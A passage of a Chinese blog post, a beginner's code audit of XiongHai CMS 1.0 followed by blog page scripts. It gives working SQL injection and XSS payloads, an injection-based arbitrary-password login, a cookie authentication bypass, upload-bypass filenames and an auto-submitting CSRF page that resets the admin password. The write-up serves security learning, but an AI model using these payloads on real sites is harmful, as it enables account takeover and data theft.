+<pre><code>/?r=contact&amp;page=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="/images/pasted-366.png" alt="upload successful"></p>
+<h4 id="software-php"><a href="#software-php" class="headerlink" title="software.php"></a>software.php</h4><p><img src="/images/pasted-358.png" alt="upload successful"><br>同理第二个地方存在注入</p>
+<p>payload:</p>
+<pre><code>1 and updatexml(1,concat(0x7e,user()),1)#</code></pre><h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>入口文件同初始入口目录相同，也同样存在文件包含</p>
+<pre><code>&lt;?php
+//单一入口模式
+error_reporting(0); //关闭错误显示
+$file=addslashes($_GET[&#39;r&#39;]); //接收文件名
+$action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于index
+include(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件
+?&gt;</code></pre><p>继续进入/admin/files/index.php目录</p>
+<pre><code>&lt;?php
+require &#39;../inc/checklogin.php&#39;;
+require &#39;../inc/conn.php&#39;;
+$indexopen=&#39;class=&quot;open&quot;&#39;;
+?&gt;</code></pre><p>查看checklogin.php对登录的验证</p>
+<pre><code>&lt;?php
+$user=$_COOKIE[&#39;user&#39;];
+if ($user==&quot;&quot;){
+header(&quot;Location: ?r=login&quot;);
+exit;    
+}
+?&gt;</code></pre><p>也就是说如果cookie中的user不为空就可以直接跳过登录，存在未授权访问<br><img src="/images/pasted-361.png" alt="upload successful"><br>这里index里还包含了后台的菜单等会再看<br>先查看登录页面login.php<br><img src="/images/pasted-367.png" alt="upload successful"><br>username并未经过过滤，存在sql注入<br><img src="/images/pasted-368.png" alt="upload successful"><br>同时这里还存在任意密码登录</p>
+<p>参考大佬的文章(涨知识了):<a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>
+<p>什么原理呢？？它这里通过查询返回的passwd字段与传入passwd的md5比较<br>而这个passwd字段我们是可控的，那么就任意密码登录了<br><img src="/images/pasted-369.png" alt="upload successful"></p>
+<p><img src="/images/pasted-370.png" alt="upload successful"></p>
+<p>所以payload:</p>
+<pre><code>username：1&#39; union select 1,2,3,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;,5,6,7,8#
+password：1</code></pre><p>这样比注入拿到md5的passwd反过来解登录舒服<br>登录跳转回index，查看刚刚index没看的后台菜单<br>95行调用了/template/top.php<br><img src="/images/pasted-362.png" alt="upload successful"><br>跟进看一下</p>
+<p><img src="/images/pasted-363.png" alt="upload successful"><br>54行对cookie的user并未经过任何过滤直接执行sql，存在cookie注入<br>而且有回显报错注入<br><img src="/images/pasted-364.png" alt="upload successful"><br>继续查看/template/sidebar.php<br>有发布内容 内容管理 栏目管理 友情链接<br>互动 设置等功能<br>查看发布内容<br>\admin\files\newwz.php<br><img src="/images/pasted-373.png" alt="upload successful"><br>查看对于上传文件的处理<br><img src="/images/pasted-374.png" alt="upload successful"><br>获取文件名称后三个字母</p>
+<pre><code> function GetFileTypeToString()
+ {
+  if( ! empty( $this -&gt; uploadFile[ &#39;name&#39; ] ) )
+  {
+   return substr( strtolower( $this -&gt; uploadFile[ &#39;name&#39; ] ) , strlen( $this -&gt; uploadFile[ &#39;name&#39; ] ) - 3 , 3 );  
+  }
+ }
+}</code></pre><p>后三个字母进行白名单处理</p>
+<pre><code>function GetFileMIME()
+ {
+  return $this-&gt;GetFileTypeToString();
+ }
+function CheckFileMIMEType()
+ {
+  $pass = false;
+  $defineTypeList = strtolower( $this -&gt;defineTypeList);
+  $MIME = strtolower( $this -&gt; GetFileMIME());
+  if (!empty ($defineTypeList))
+  {
+   if (!empty ($MIME))
+   {
+    foreach(explode(&quot;|&quot;,$defineTypeList) as $tmp)
+    {
+     if ($tmp == $MIME)
+     {
+      $pass = true;
+     }
+    }</code></pre><p>到目前为止其实还是可以绕过的，可以利用shell.php/jpg<br>test.php%00.jpg test.php:1.jpg(windows)</p>
+<p>取决于你的保存方式</p>
+<p>查看保存</p>
+<p><img src="/images/pasted-375.png" alt="upload successful"><br>随机数+时间加文件名后三位，就是检测的后三位，抬走上传不了(个人理解)即使传图片马利用文件包含但是我们没似乎也不知道文件名</p>
+<p>继续看发布文章,83行没有经过过滤直接插入数据库存在sql注入<br><img src="/images/pasted-376.png" alt="upload successful"><br>payload:</p>
+<pre><code>1&#39; and updatexml(1,concat(0x7e,user()),1) and &#39;</code></pre><p>发布下载newsoft和上面一样不看了</p>
+<p>继续看wzlist.php</p>
+<p><img src="/images/pasted-377.png" alt="upload successful"><br>同样原理sql注入不在多说，编辑文章和上面一样<br>softlist.php和newsoft一样不看了<br>继续看栏目管理<br>newcolumn.php没有过滤sql注入(同样原理)<br><img src="/images/pasted-378.png" alt="upload successful"><br>columnlist.php sql注入<br><img src="/images/pasted-379.png" alt="upload successful"><br>后面的各种设置漏洞都差不多<br>查看修改密码部分</p>
+<p><img src="/images/pasted-380.png" alt="upload successful"><br>修改密码并没有要之前的密码，而验证是否是管理员<br>还是cookie的方式<br>所以存在csrf<br>burp抓包<br><img src="/images/pasted-381.png" alt="upload successful"></p>
+<pre><code>&lt;html&gt;
+  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+  &lt;body&gt;
+  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
+    &lt;script&gt;
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open(&quot;POST&quot;, &quot;http:\/\/127.0.0.1\/xhcms\/admin\/?r=manageinfo&quot;, true);
+        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8&quot;);
+        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;);
+        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart\/form-data; boundary=---------------------------36130568313950689285470620618&quot;);
+        xhr.withCredentials = true;
+        var body = &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;user\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;admin\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;admin\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;password\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;12345\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;password2\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;12345\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;mail\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;me@isea.so\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;qq\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;86226999\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;images\&quot;; filename=\&quot;\&quot;\r\n&quot; + 
+          &quot;Content-Type: application/octet-stream\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;save\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;1\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618--\r\n&quot;;
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i &lt; aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    &lt;/script&gt;
+    &lt;form action=&quot;#&quot;&gt;
+      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot; /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+&lt;html&gt;
+  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+  &lt;body&gt;
+  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
+    &lt;script&gt;
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open(&quot;POST&quot;, &quot;http:\/\/127.0.0.1\/xhcms\/admin\/?r=manageinfo&quot;, true);
+        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8&quot;);
+        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;);
+        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart\/form-data; boundary=---------------------------36130568313950689285470620618&quot;);
+        xhr.withCredentials = true;
+        var body = &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;user\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;admin\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;admin\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;password\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;12345\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;password2\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;12345\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;mail\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;me@isea.so\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;qq\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;86226999\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;images\&quot;; filename=\&quot;\&quot;\r\n&quot; + 
+          &quot;Content-Type: application/octet-stream\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;save\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;1\r\n&quot; + 
+          &quot;-----------------------------36130568313950689285470620618--\r\n&quot;;
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i &lt; aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    &lt;/script&gt;
+    &lt;form action=&quot;#&quot;&gt;
+      &lt;input id=&quot;lnng&quot; type=&quot;Submit&quot; value=&quot;Submit&quot; onclick=&quot;submitRequest();&quot; /&gt;
+    &lt;/form&gt;
+      &lt;script type=&quot;text/javascript&quot;&gt;                          // js自动点击
+      var lnng = document.getElementById(&quot;lnng&quot;);
+      lnng.click();
+  &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>设置js自动点击，在设置之前的存储xss跳转到csrf页面<br>成功修改密码</p>
+<p>后台中还有很多比如删除文章等地方同样存在csrf，同样原理</p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>第一次代码审计选了个简单的cms，不涉及框架很适合我这种小白，体验还不错(其实看了蛮久的，唉)</p>
+<p>如有错误请大佬指点，感谢</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>evils大佬:<a href="https://evi1s.com/archives/124/" target="_blank" rel="noopener">https://evi1s.com/archives/124/</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lnng.top" rel="external nofollow noreferrer">Lmg</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lnng.top/posts/e2e8.html">https://lnng.top/posts/e2e8.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://lnng.top" target="_blank">Lmg</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC80OTIwMS8yNTY5NQ==">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/e2e8.html">
+                    <div class="card-image">
+                        
+                        <img src="https://Lmg66.github.io/images/pasted-382.png" class="responsive-img" alt="php代码审计初试-熊海CMS1-0">
+                        
+                        <span class="card-title">php代码审计初试-熊海CMS1-0</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            源码下载站长下载:http://down.chinaz.com/soft/36930.htm
+环境配置VSCode phpstudy2018 php5.6.27
+配置方法:国光大佬https://www.sqlsec.com/2020/09
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/4b57.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="内网信息收集学习笔记">
+                        
+                        <span class="card-title">内网信息收集学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言本文主要是学习《内网安全攻防 渗透测试实战指南》的阅读笔记防止遗忘也是总结吧
+基本命令
+探测域内存活主机利用NetBIOSNetBIOS是局域网程序使用的一种应用程序编程接口，为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Lmg
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Script kiddie&#39;s life<br />'
+            + '文章作者: Lmg<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="https://lnng.top" target="_blank">Lmg</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+             <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-heart-o"></i> 本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>   <span id="busuanzi_container_site_uv" style='display:none'></span> 人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人. 
+
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "22";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+
+                setInterval(siteTime, 1000);
+            </script>
+
+            
+            <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script> 
+            <script type="text/javascript">  
+            document.write('欢迎来自:' + returnCitySN["cname"]+'的朋友' + ",您的IP:" + returnCitySN["cip"] + ",浏览器版本:"+getBrowserInfo());
+        function getBrowserInfo()
+{
+    var agent = navigator.userAgent.toLowerCase() ;
+    var regStr_ie = /msie [\d.]+;/gi ;
+    var regStr_ff = /firefox\/[\d.]+/gi
+    var regStr_chrome = /chrome\/[\d.]+/gi ;
+    var regStr_saf = /safari\/[\d.]+/gi ;
+    //IE
+    if(agent.indexOf("msie") > 0)
+    {
+        return agent.match(regStr_ie) ;
+    }
+    //firefox
+    if(agent.indexOf("firefox") > 0)
+    {
+        return agent.match(regStr_ff) ;
+    }
+    //Chrome
+    if(agent.indexOf("chrome") > 0)
+    {
+        return agent.match(regStr_chrome) ;
+    }
+    //Safari
+    if(agent.indexOf("safari") > 0 && agent.indexOf("chrome") < 0)
+    {
+        return agent.match(regStr_saf) ;
+    }
+}
+</script> 
+
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Lmg66" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1589862745@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1589862745" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1589862745" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+<!-- <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script> -->
+
+<!-- <script src="/js/cursor.js"></script> -->
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
